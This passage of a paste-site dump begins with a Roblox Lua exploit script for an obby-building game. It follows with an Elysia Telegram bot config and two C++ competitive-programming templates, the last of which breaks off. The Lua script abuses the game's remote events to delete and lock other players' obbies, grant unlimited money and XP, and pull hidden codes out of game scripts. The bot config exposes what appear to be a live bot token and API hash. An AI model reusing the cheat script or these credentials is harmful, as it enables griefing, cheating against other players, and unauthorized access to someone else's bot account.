        game:GetService(""ReplicatedStorage"").removeobby:InvokeServer((#game.Workspace.Terrain.Obbyplot[plrtable.plrobby].Obby:GetChildren()),plrtable.plrobby,0,0,-5,true)
        success(plr)
    end
end)
makecmd(""deleteplrobby"",""Deletes the whole obby. You need to have used selectplrobby for this."",true,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.plrobby then
        repeat
            wait(.1)
            game:GetService(""ReplicatedStorage"").removeobby:InvokeServer((#game.Workspace.Terrain.Obbyplot[plrtable.plrobby].Obby:GetChildren()),plrtable.plrobby,0,0,-5,true)
        until (#game.Workspace.Terrain.Obbyplot[plrtable.plrobby].Obby:GetChildren()) <= 0
        success(plr)
    end
end)
makecmd(""winobby"",""Win's the obby, Example: winobby Red"",false,true,function(plr,args)
    args = combineargs(args)
    local plrobby = findobj(args[1],game.Workspace.Terrain.Obbyplot)
    if plrobby then
        for i,v in pairs(plrobby:GetChildren()) do
            if v:IsA(""Model"") then
                if v.Name ~= ""looks"" and v.Name ~= ""finish_race"" then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.money.CFrame
                    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.money, 0)
                elseif v.Name == ""finish_race"" then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.finishline.CFrame
                    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.finishline, 0)
                end
            end
        end
        success(plr)
    end
end)
makecmd(""buildrandomobby"",""Builds a random obby, You need to have used selectplrobby for this."",true,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.plrobby then
        game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(game.ReplicatedStorage.obys:GetChildren()[math.random(1,#game.ReplicatedStorage.obys:GetChildren())].Name,plrtable.plrobby,0,0,-5,costmoney)
        success(plr)
    end
end)
makecmd(""setfinish"",""Sets the obby's Finish, You need to have used selectplrobby for this, Example: setfinish 4M_Visits"",true,true,function(plr,args)
    args = combineargs(args)
    local finish = findobj(args[1],game.ReplicatedStorage[""obby_Finish""])
    local plrtable = getplrtable(plr)
    if finish and plrtable.plrobby then
        game:GetService(""ReplicatedStorage"").Finishf:InvokeServer(plrtable.plrobby,finish.Name)
        success(plr)
    end
end)
makecmd(""setsongid"",""Sets the song id but it may be censored, You need to have used selectplrobby for this, Example: setsongid 142376088"",true,true,function(plr,args)
    args = combineargs(args)
    local plrtable = getplrtable(plr)
    if finish and plrtable.plrobby then
        game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,args[1],""sound"")
        success(plr)
    end
end)
makecmd(""setplrobbyname"",""Sets the player obby's Name, You need to have used selectplrobby for this, Example: setplrobbyname TEST"",true,true,function(plr,args)
    args = combineargs(args)
    local plrtable = getplrtable(plr)
    if finish and plrtable.plrobby then
        game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,args[1],""Newname"")
        success(plr)
    end
end)
makecmd(""makeobby"",""Makes a premade obby for you, You need selectplrobby for this, If you are looking for the premade obby names, do 'help premadeobbies', Example: makeobby ladder"",true,true,function(plr,args)
    args = combineargs(args)
    local plrtable = getplrtable(plr)
    local txt = args[1]:lower()
    if plrtable.plrobby then
        if txt == ""free money obby"" then
            local args
            args = {""Golden Goat Troll"",plrtable.plrobby,0,20,54.275516510009766,costmoney}
            for i=1,10 do
                game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            end
            args = {""Race checkpoint"",plrtable.plrobby,0,-179,17.275516510009766,costmoney}
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            game:GetService(""ReplicatedStorage"").Finishf:InvokeServer(plrtable.plrobby,""4M_Views"")
            game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobbyewname"")
            game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,""rainbowblocks"",""Sky"")
            game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,""142376088"",""sound"")
            success(plr)
        elseif txt == ""free money obby v2"" then
            local args
            args = {""Golden Goat Troll"",plrtable.plrobby,0,1,49.275516510009766,costmoney}
            for i=1,9 do
                game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            end
            args[4] = 0
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(""Grass Checkpoint"",plrtable.plrobby,0,-8,75,costmoney)
            game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,""rainbowblocks"",""Sky"")
            game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,""142376088"",""sound"")
            game:GetService(""ReplicatedStorage"").Finishf:InvokeServer(plrtable.plrobby,""4M_Views"")
            success(plr)
        elseif txt == ""free money obby v2 (20 obby ver)"" or txt == ""free money obby v2 (20 obby version)"" then
            local args
            args = {""Golden Goat Troll"",plrtable.plrobby,0,1,49.275516510009766,costmoney}
            for i=1,9 do
                game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            end
            args[4] = 0
            for i=1,11 do
                game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            end
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(""Grass Checkpoint"",plrtable.plrobby,0,-8,75,costmoney)
            game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,""rainbowblocks"",""Sky"")
            game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,""142376088"",""sound"")
            game:GetService(""ReplicatedStorage"").Finishf:InvokeServer(plrtable.plrobby,""4M_Views"")
            success(plr)
        elseif txt == ""sus"" or txt == ""bruh"" then
            local args
            args = {""Golden Goat Troll"",plrtable.plrobby,0,0,-5,costmoney}
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            args[3] = 18.002552032470703
            args[4] = 10
            args[5] = 54.275516510009766
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            args[3] = 0
            args[4] = 2
            args[5] = 49.275516510009766
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            args[3] = 18.002552032470703
            args[4] = -2
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            args[3] = 0
            args[4] = 4
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            args[3] = 18.002552032470703
            args[4] = -16
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            args[3] = 0
            args[4] = 2
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            success(plr)
        elseif txt == ""ladder"" then
            local args = {""Race checkpoint"",plrtable.plrobby,0,0,0,costmoney}
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            args[1] = ""Golden Goat Troll""
            args[5] = -5
            for i=1,9 do
                game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            end
            game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,""rainbowblocks"",""Sky"")
            game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,""142376088"",""sound"")
            success(plr)
        end
    end
end)
makecmd(""gettrails"",""Get every trail in the game, Lasts before you leave."",false,false,function(plr,args)
    for i,v in pairs(game.Players.LocalPlayer.PlayerGui.menu.Trails.Frame[""trails_frames""]:GetChildren()) do
        if v:IsA(""ImageLabel"") then 
            v.Visible = true
        end
    end
    for i,v in pairs(game.Players.LocalPlayer.PlayerGui.menu.Trails.trails:GetChildren()) do
        if v:IsA(""BoolValue"") then
            v.Value = true
        end
    end
    success(plr)
end)
makecmd(""unlockallobbies"",""Unlocks every player's obbies."",true,false,function(plr,args)
    for i,v in pairs(workspace.Terrain.Obbyplot:GetChildren()) do
        game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(v.Name,""unlock"",""door"")
    end
    success(plr)
end)
makecmd(""lockallobbies"",""Locks every player's obbies."",true,false,function(plr,args)
    for i,v in pairs(workspace.Terrain.Obbyplot:GetChildren()) do
        game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(v.Name,""lock"",""door"")
    end
    success(plr)
end)
makecmd(""unlockobby"",""Unlocks the player's obby, You need to have used selectplrobby for this."",true,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.plrobby then
        game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,""unlock"",""door"")
        success(plr)
    end
end)
makecmd(""lockobby"",""Locks the player's obby, You need to have used selectplrobby for this."",true,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.plrobby then
        game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,""lock"",""door"")
        success(plr)
    end
end)
makecmd(""listallobbystats"",""Lists all the obby's stats and puts them in a file."",false,false,function(plr,args)
    if not supportfiles then return end
    for i,v in pairs(game:GetService(""ReplicatedStorage"").obys:GetChildren()) do
        if v:IsA(""Model"") then
            add(v.Name,""buildanobbystats.lua"")
            add(""Gives: ""..tostring(v.mps.Value),""buildanobbystats.lua"")
            add(""Cost: ""..tostring(v.Price.Value),""buildanobbystats.lua"")
            add(""Size: ""..tostring(v:GetExtentsSize()),""buildanobbystats.lua"")
            add(""-----------------------------------------------------"",""buildanobbystats.lua"")
        end
    end
    success(plr)
end)
makecmd(""showobbygui"",""Shows an obby gui, Example: showobbygui Troll_Pass"",false,true,function(plr,args)
    args = combineargs(args)
    for i,v in pairs(game.Players.LocalPlayer.PlayerGui.menu.build.MAIN.Frame:GetChildren()) do
        if v.Name == args[1] then
            v.Visible = true
            for i,v in pairs(v:GetChildren()) do
                if v:IsA(""ImageLabel"") then
                    v.Visible = true
                end
            end
            success(plr)
        else
            v.Visible = false
        end
    end
end)
makecmd(""showallobbyguis"",""Shows all the obby gui's buttons"",false,false,function(plr,args)
    for i,v in pairs(game.Players.LocalPlayer.PlayerGui.menu.build.MAIN.buttons:GetChildren()) do
        if v:IsA(""ImageButton"") then
            v.Visible = true
        end
    end
    success(plr)
end)
makecmd(""listalladmins"",""Lists all the admins you whitelisted."",true,false,function(plr,args)
    local adminslist = """"
    for i,v in pairs(wl) do
        adminslist = adminslist..i.."" | ""
    end
    sayto(plr,adminslist)
end)
makecmd(""addmoney"",""Adds money to yourself, Example: addmoney 999"",false,true,function(plr,args)
    local amt = tonumber(args[1])
    if amt then
        game:GetService(""ReplicatedStorage"").EnterCode:FireServer(amt,""get trolled"",""Cash"")
    end
    success(plr)
end)
makecmd(""submoney"",""Subtracts money to yourself, Example: submoney 999"",false,true,function(plr,args)
    local amt = tonumber(args[1])
    if amt then
        game:GetService(""ReplicatedStorage"").EnterCode:FireServer(-amt,""get trolled"",""Cash"")
    end
    success(plr)
end)
makecmd(""setxp"",""Sets the xp you currently have, Example: setxp 10"",false,true,function(plr,args)
    local amt = tonumber(args[1])
    if amt then
        game:GetService(""ReplicatedStorage"").EnterCode:FireServer(amt,""get trolled"",""xp"")
    end
    success(plr)
end)
makecmd(""farmlevels"",""Farm levels, Although this can be a little bit risky"",false,false,function(plr,args)
    repeat
        task.wait()
        game:GetService(""ReplicatedStorage"").EnterCode:FireServer(999999999999999999,""get trolled"",""xp"")
        task.wait()
        game:GetService(""ReplicatedStorage"").EnterCode:FireServer(0,""get trolled"",""xp"")
        if supportgetgenv then
            farmlevels = getgenv().farmlevels
        end
    until farmlevels == false
    success(plr)
end)
makecmd(""stopfarmlevels"",""Stop farming levels"",false,false,function(plr,args)
    farmlevels = false
    if supportgetgenv then
        getgenv().farmlevels = farmlevels
    end
    success(plr)
end)
makecmd(""setprefix"",""Set the prefix of your own prefix, Example: setprefix :"",false,true,function(plr,args)
    local setprefix = combineargs(args)[1]
    prefix = setprefix
    if supportgetgenv then
        getgenv().prefix = prefix
    end
    success(plr)
end)
makecmd(""setprefix2"",""Set the prefix of the whitelisted people, Example: setprefix2 ;"",false,true,function(plr,args)
    local setprefix2 = combineargs(args)[1]
    prefix2 = setprefix2
        if supportgetgenv then
        getgenv().prefix2 = prefix2
    end
    updatewhitelistmessage()
    success(plr)
end)
makecmd(""printallplrobbynames"",""Prints all of the player obby names."",false,false,function(plr,args)
    for i,v in pairs(workspace.Terrain.Obbyplot:GetChildren()) do
        print(v.Name)
    end
    success(plr)
end)
makecmd(""printallobbynames"",""Prints all of the obby names."",false,false,function(plr,args)
    for i,v in pairs(game.ReplicatedStorage.obys:GetChildren()) do
        print(v.Name)
    end
    success(plr)
end)
makecmd(""printallfinishes"",""Prints all of the finish names."",false,false,function(plr,args)
    for i,v in pairs(game.ReplicatedStorage[""obby_Finish""]:GetChildren()) do
        print(v.Name)
    end
    success(plr)
end)
makecmd(""printallcodes"",""Prints all of the codes."",false,false,function(plr,args)
    for i,v in pairs(getconstants(getscriptclosure(game:GetService(""Players"").LocalPlayer.PlayerGui.menu.Info.Frame.Codes.Enter.LocalScript))) do
        if typeof(v) == ""string"" then
            print(i,v)
        end
    end
    warn(""codes are around 22 to 27"")
    success(plr)
end)
makecmd(""printallobbyguis"",""Prints all of the obby gui's."",false,false,function(plr,args)
    for i,v in pairs(game.Players.LocalPlayer.PlayerGui.menu.build.MAIN.Frame:GetChildren()) do
        print(v.Name)
    end
    success(plr)
end)
makecmd(""printselectedobbysize"",""Prints the selected obby size, You need to have used selectobby for this."",false,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.obby then
        print(game.ReplicatedStorage.obys[plrtable.obby]:GetExtentsSize())
    end
end)
makecmd(""copyselectedobbysize"",""Copies the selected obby size, You need to have used selectobby for this."",false,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.obby then
        setclipboard(tostring(game.ReplicatedStorage.obys[plrtable.obby]:GetExtentsSize()))
    end
end)
makecmd(""getallplrobbynames"",""Gets all of the player obby names."",true,false,function(plr,args)
    local str = """"
    for i,v in pairs(workspace.Terrain.Obbyplot:GetChildren()) do
        str = str..v.Name.."" , ""
    end
    for i,v in pairs(splittext(str)) do
        sayto(plr,v)
    end
end)
makecmd(""getallobbynames"",""Gets all of the obby names."",true,false,function(plr,args)
    local str = """"
    for i,v in pairs(game.ReplicatedStorage.obys:GetChildren()) do
        str = str..v.Name.."" , ""
    end
    for i,v in pairs(splittext(str)) do
        sayto(plr,v)
    end
end)
makecmd(""getallfinishnames"",""Gets all of the finish names."",true,false,function(plr,args)
    local str = """"
    for i,v in pairs(game.ReplicatedStorage[""obby_Finish""]:GetChildren()) do
        str = str..v.Name.."" , ""
    end
    for i,v in pairs(splittext(str)) do
        sayto(plr,v)
    end
end)
makecmd(""getallcodes"",""Gets all of the codes."",true,false,function(plr,args)
    local str = """"
    for i,v in pairs(getconstants(getscriptclosure(game:GetService(""Players"").LocalPlayer.PlayerGui.menu.Info.Frame.Codes.Enter.LocalScript))) do
        if typeof(v) == ""string"" then
            str = str..v.Name.."" , ""
        end
    end
    for i,v in pairs(splittext(str)) do
        sayto(plr,v)
    end
end)
makecmd(""getselectedobbysize"",""Gets the selected obby size, You need to have used selectobby for this."",true,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.obby then
        local size = game.ReplicatedStorage.obys[plrtable.obby]:GetExtentsSize()
        if args then
            local pos = combineargs(args)[1]:upper()
            if size[pos] then
                pos = tostring(size[pos])
                string.sub(pos,1,string.find(pos,""."")+2)
                sayto(plr,pos)
            end
        else
            size.X = pos
            string.sub(pos,1,string.find(pos,""."")+2)
            size.Y = pos
            string.sub(pos,1,string.find(pos,""."")+2)
            size.Z = pos
            string.sub(pos,1,string.find(pos,""."")+2)
            size = tostring(size)
            sayto(plr,size)
        end
    end
end)
makecmd(""help"",""Help command, Use if you are confused on a command, Example: help selectplrobby"",true,true,function(plr,args)
    local cmd = args[1]:lower()
    if cmddesc[cmd] then
        sayto(plr,cmddesc[cmd])
    end
end)
makecmd(""cmds"",""Shows all of the commands"",true,false,function(plr,args)
    local msg = """"
    for i,v in pairs(cmds) do
        if v[1] == true then
            msg = msg..i.."" | ""
        end
    end
    local splitmessages = splittext(msg)
    for i,v in pairs(splitmessages) do
        wait(.1)
        sayto(plr,v)
    end
end)
makecmd(""kill"",""Warning: Deletes the player's obby before killing them, Example: kill AreYouMental110"",true,true,function(plr,args)
    sayto(plr,""WORK IN PROGRESS"")
end)
makecmd(""killplrobby"",""Deletes the selected obby before killing the player, You need selectplrobby for this, Example: killplrobby AreYouMental110"",true,true,function(plr,args)
    sayto(plr,""WORK IN PROGRESS"")
end)
makecmd(""press2kill"",""Click to kill"",false,true,function(plr,args)
    notify(""WORK IN PROGRESS"")
end)
makecmd(""stoppress2kill"",""Stop click to kill"",false,true,function(plr,args)
    notify(""WORK IN PROGRESS"")
end)
localplrmessage = localplr.Chatted:Connect(function(message)
    local speaker = localplr.Name
    if string.sub(message,1,string.len(prefix)) == prefix then
        local cmd
        local args
        if string.find(message,"" "") then
            cmd = string.sub(message:lower(),string.len(prefix)+1,string.find(message,"" "")-1)
            local tosplit = string.sub(message,string.find(message,"" "")+1)
            args = string.split(tosplit,"" "")
        else
            cmd = string.sub(message:lower(),string.len(prefix)+1)
        end
        for i,v in pairs(cmds) do
            if i:lower() == cmd then
                if v[2] == true and args then
                    v[3](speaker,args)
                elseif v[2] == false then
                    v[3](speaker)
                end
            end
        end 
    elseif message:lower() == ""end"" then
        endfunc()
    end
end)
otherplrmessage = game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(stuff)
    local speaker = stuff.FromSpeaker
    local message = stuff.Message
    if speaker ~= localplr.Name and wl[speaker] and string.sub(message,1,string.len(prefix2)) == prefix2 then
        local cmd
        local args
        if string.find(message,"" "") then
            cmd = string.sub(message:lower(),string.len(prefix2)+1,string.find(message,"" "")-1)
            local tosplit = string.sub(message,string.find(message,"" "")+1)
            args = string.split(tosplit,"" "")
        else
            cmd = string.sub(message:lower(),string.len(prefix2)+1)
        end
        for i,v in pairs(cmds) do
            if v[1] == true and i:lower() == cmd then
                print(i)
                if v[2] == true and args then
                    v[3](speaker,args)
                elseif v[2] == false then
                    v[3](speaker)
                end
            end
        end 
    end
end)
local onplradded = game.Players.PlayerAdded:Connect(function(plr)
    if localplr:IsFriendsWith(plr.UserId) and autowhitelistfriends == true and not wl[plr.Name] then
        sayto(plr.Name,autowhitelistmessage)
        wl[plr.Name] = {}
    end
end)
if autowhitelistfriends then
    for i,plr in pairs(game.Players:GetPlayers()) do
        if localplr:IsFriendsWith(plr.UserId) and autowhitelistfriends == true and not wl[plr.Name] then
            sayto(plr.Name,autowhitelistmessage)
            wl[plr.Name] = {}
        end
    end
end
endfunc = function()
    localplrmessage:Disconnect()
    otherplrmessage:Disconnect()
    farmlevels = false
    if supportgetgenv then
        getgenv().farmlevels = false
        getgenv().endfunc = nil
    end
    for i,v in pairs(game.Players:GetPlayers()) do
        if wl[v.Name] then
            sayto(v.Name,unwhitelistmessage)
        end
    end
    notify(""Admin ending."")
end
if supportgetgenv then
    getgenv().endfunc = endfunc
end
for i,v in pairs(cmddesc) do
    local cmd = i.."" - ""..v
    if cmds[i] and cmds[i][1] == true then
        cmd = cmd.."" (WHITELIST CAN USE)""
    end
    cmd = cmd..[[


]]
    if supportsrconsole and enablerconsole then
        rconsoleprint(cmd)
    else
        print(cmd)
    end
end
function updatevalues()
    autowhitelistfriends = getgenv().autowhitelistfriends
    prefix = getgenv().prefix
    prefix2 = getgenv().prefix2
    successmessage = getgenv().successmessage
    updatewhitelistmessage()
    unwhitelistmessage = getgenv().unwhitelistmessage
    canwhitelistmessage = getgenv().canwhitelistmessage
    costmoney = getgenv().costmoney
    enablerconsole = getgenv().enablerconsole
end
function setgetgenv(txt,val)
    if supportgetgenv and getgenv()[txt] then
        getgenv()[txt] = val
        updatevalues()
    end
end
notify(""Done Loading!"")
return setgetgenv"
1iFxKGDj,Elysia Configurations,Nicky-Lalrochhara,Python,Saturday 19th of August 2023 10:20:32 AM CDT,"from typing import List
import os.path

# This is a template configuration file for Elysia.
# You can use this file as a base for your own config file by
# copying this file to `Elysia/config.py` and filling in the values.
#


# API keys

# Bot token from Bot Father
TOKEN: str = ""220947927:AAHVhKb4ZAWiNCHYgcDlzjX3ZKJLDpdBV2g""

# Telegram API ID and API hash
# Get it from https://my.telegram.org/apps
API_ID: int = 611335
API_HASH: str = ""d524b414d21f4d37f08684c1df41ac9c""

# Tenor API key
# Get it from https://tenor.com/developer/keyregistration
# Can be empty (but the /gif command won't work without it)
TENOR_API_KEY: str = ""anything""


# Admins/sudoers settings

# Sudoers and super sudoers
SUPER_SUDOERS: List[int] = [2106498721]
SUDOERS: List[int] = [""1060318977"", ""2106498721""]

# All super sudoers should be sudoers as well
SUDOERS.extend(SUPER_SUDOERS)


# Other settings

# Database file path
DATABASE_PATH = os.path.join(""Elysia"", ""database"", ""Elysia.db"")

# Number of updates that can be processed in parallel
WORKERS = 8

# Chat used for logging
LOG_CHAT: int = -1001826367325

# Prefixes for commands
# e.g: /command and !command
PREFIXES: List[str] = [""/"", ""!""]

# List of disabled plugins
DISABLED_PLUGINS: List[str] = []"
hPvgfC0k,Untitled,Sreekar_0125,C++,Saturday 19th of August 2023 10:17:37 AM CDT,"#include <bits/stdc++.h>
using namespace std;
// #define cerr if(false)cerr
#define int long long
#define pb push_back
#define F first
#define S second
#define yes cout << ""Yes\n""
#define no cout << ""No\n""
#define yn(x) x ? yes : no
#define f(i, s, e) for (int i = s; i < e; i++)
#define traverse(i, a) for (auto i : a)
#define set_bits(x) __builtin_popcountll(x)
#define leading_zero(x) __builtin_clz(x)
#define trailing_zero(x) __builtin_ctz(x)
#define vi vector<int>
#define vb vector<bool>
#define pii pair<int, int>
#define vpi vector<pii>
#define umi unordered_map<int, int>
#define mi map<int, int>
#define si set<int>
#define sc set<char>
#define maxheap priority_queue<int>
#define minheap priority_queue<int, vector<int>, greater<int>>
#define all(x) x.begin(), x.end()
#define minele(x) *min_element(all(x))
#define maxele(x) *max_element(all(x))
#define MOD 1000000007
#define endl '\n'

#ifndef ONLINE_JUDGE
#define debug(x)            \
    cerr << (#x) << "" is ""; \
    _print(x)
#define dbg(x) \
    cerr << (#x) << "" is "" << x << endl;
#else
#define debug(x)
#define dbg(x)
#endif

const int N = 2e5;

template <typename T>
void _print(T a)
{
    cerr << a;
}
template <typename T>
void print(T a)
{
    cout << a << ' ';
}
template <typename T>
void println(T a)
{
    cout << a << endl;
}

template <typename T>
void input(vector<T> &v)
{
    f(i, 0, (int)v.size()) cin >> v[i];
}

template <typename T>
void input(T &a)
{
    cin >> a;
}

template <typename T>
void print(vector<T> &v)
{
    f(i, 0, (int)v.size()) cout << v[i] << ' ';
    cout << endl;
}

template <class T, class V>
void _print(pair<T, V> p);
template <class T>
void _print(vector<T> v);
template <class T>
void _print(set<T> v);
template <class T, class V>
void _print(map<T, V> v);
template <class T>
void _print(multiset<T> v);
template <class T, class V>
void _print(pair<T, V> p)
{
    cerr << ""{"";
    _print(p.F);
    cerr << "","";
    _print(p.S);
    cerr << ""} "";
}
template <class T>
void _print(vector<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(set<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(multiset<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(unordered_map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}

/////////////Sieve///////////////
// vb sieve(N + 5, true);
// vi primes;
// void gensieve()
// {
//     sieve[0] = sieve[1] = false;
//     for (int i = 2; i <= sqrt(N); i++)
//     {
//         if (sieve[i])
//         {
//             for (int j = i * i; j <= N; j += i)
//                 sieve[j] = false;
//         }
//     }
//     for (int i = 2; i <= N; i++)
//     {
//         if (sieve[i])
//             primes.pb(i);
//     }
// }
////////////////////////////////

int binpow(int a, int b, int m)
{
    a %= m;
    int ans = 1;
    while (b > 0)
    {
        if (b & 1)
        {
            ans = (ans * a) % MOD;
        }
        a = (a * a) % MOD;
        b >>= 1;
    }
    return ans;
}

int modadd(int a, int b)
{
    return (a % MOD + b % MOD) % MOD;
}
int modsub(int a, int b)
{
    return ((a % MOD - b % MOD) % MOD + MOD) % MOD;
}
int modmul(int a, int b)
{
    return (a % MOD * b % MOD) % MOD;
}
int moddiv(int a, int b)
{
    return ((a % MOD) * (binpow(b, MOD - 2, MOD))) % MOD;
}

int lbnd(vi &v, int x)
{
    int n = v.size();
    int low = 0;
    int high = n - 1;
    int ans = -1;
    while (low <= high)
    {
        int mid = (low + high) >> 1;
        if (v[mid] <= x)
        {
            ans = mid;
            low = mid + 1;
        }
        else
        {
            high = mid - 1;
        }
    }
    return ans;
}

int ubnd(vi &v, int x)
{
    int n = v.size();
    int low = 0;
    int high = n - 1;
    int ans = -1;
    while (low <= high)
    {
        int mid = (low + high) >> 1;
        if (v[mid] >= x)
        {
            ans = mid;
            high = mid - 1;
        }
        else
        {
            low = mid + 1;
        }
    }
    return ans;
}

vpi moves = {{0, 1}, {1, 0}, {0, -1}, {-1, 0}};
// vi graph[N + 1];
// vb visited(N + 1, false);
// vi parent(N + 1, -1);
// vi level(N + 1, 0);

// void bfs(vi *graph, vb &visited, vi &parent, vi &level, int start)
// {
//     queue<int> q;
//     visited[start] = true;
//     q.push(start);
//     while (!q.empty())
//     {
//         int node = q.front();
//         traverse(i, graph[node])
//         {
//             if (!visited[i])
//             {
//                 if (parent[i] == -1)
//                     parent[i] = node;
//                 if (level[i] == 0)
//                     level[i] = 1 + level[node];
//                 visited[i] = true;
//                 q.push(i);
//             }
//         }
//         q.pop();
//     }
// }

// void dfs(vi *graph, vb &visited, int start)
// {
//     visited[start] = true;
//     traverse(i, graph[start])
//     {
//         if (!visited[i])
//         {
//             visited[i] = true;
//             dfs(graph, visited, i);
//         }
//     }
// }

void fast()
{
    ios_base::sync_with_stdio(false);
    cin.tie(NULL);
    cout.tie(NULL);
}

void init_code()
{
#ifndef ONLINE_JUDGE
    freopen(""input.txt"", ""r"", stdin);
    freopen(""output.txt"", ""w"", stdout);
    freopen(""error.txt"", ""w"", stderr);
#endif // ONLINE_JUDGE
}

bool isValid(int a, int b, int n)
{
    return ((a < n && a >= 0) && (b < n && b >= 0));
}

void dfs(vector<vi> &grid, vector<vb> &visited, int a, int b, int &ans)
{
    visited[a][b] = true;
    ans++;

    for (auto i : moves)
    {
        int x = a + i.F;
        int y = b + i.S;
        if (isValid(x, y, grid.size()))
            if (!visited[x][y])
            {
                dfs(grid, visited, x, y, ans);
            }
    }

    return;
}

void solve()
{
    int n, a, b;
    cin >> n >> a >> b;
    a--;
    b--;

    vector<vi> grid(n, vi(n));
    vector<vb> visited(n, vb(n, false));

    int ans = 1;

    for (auto i : moves)
    {
        int x = 0;
        if (isValid(a + i.F, b + i.S, n))
            dfs(grid, visited, a + i.F, b + i.S, x);
        dbg(x);
        ans = max(ans, x);
    }
    println(ans);
}

signed main()
{
    init_code();
    fast();
    int t = 1;
    cin >> t;
    // gensieve();
    while (t--)
    {
        solve();
    }
    return 0;
}
"
N32PiDUW,Untitled,Sreekar_0125,C++,Saturday 19th of August 2023 10:15:27 AM CDT,"#include <bits/stdc++.h>
using namespace std;
// #define cerr if(false)cerr
#define int long long
#define pb push_back
#define F first
#define S second
#define yes cout << ""Yes\n""
#define no cout << ""No\n""
#define yn(x) x ? yes : no
#define f(i, s, e) for (int i = s; i < e; i++)
#define traverse(i, a) for (auto i : a)
#define set_bits(x) __builtin_popcountll(x)
#define leading_zero(x) __builtin_clz(x)
#define trailing_zero(x) __builtin_ctz(x)
#define vi vector<int>
#define vb vector<bool>
#define pii pair<int, int>
#define vpi vector<pii>
#define umi unordered_map<int, int>
#define mi map<int, int>
#define si set<int>
#define sc set<char>
#define maxheap priority_queue<int>
#define minheap priority_queue<int, vector<int>, greater<int>>
#define all(x) x.begin(), x.end()
#define minele(x) *min_element(all(x))
#define maxele(x) *max_element(all(x))
#define MOD 1000000007
#define endl '\n'

#ifndef ONLINE_JUDGE
#define debug(x)            \
    cerr << (#x) << "" is ""; \
    _print(x)
#define dbg(x) \
    cerr << (#x) << "" is "" << x << endl;
#else
#define debug(x)
#define dbg(x)
#endif

const int N = 2e5;

template <typename T>
void _print(T a)
{
    cerr << a;
}
template <typename T>
void print(T a)
{
    cout << a << ' ';
}
template <typename T>
void println(T a)
{
    cout << a << endl;
}

template <typename T>
void input(vector<T> &v)
{
    f(i, 0, (int)v.size()) cin >> v[i];
}

template <typename T>
void input(T &a)
{
    cin >> a;
}

template <typename T>
void print(vector<T> &v)
{
    f(i, 0, (int)v.size()) cout << v[i] << ' ';
    cout << endl;
}

template <class T, class V>
void _print(pair<T, V> p);
template <class T>
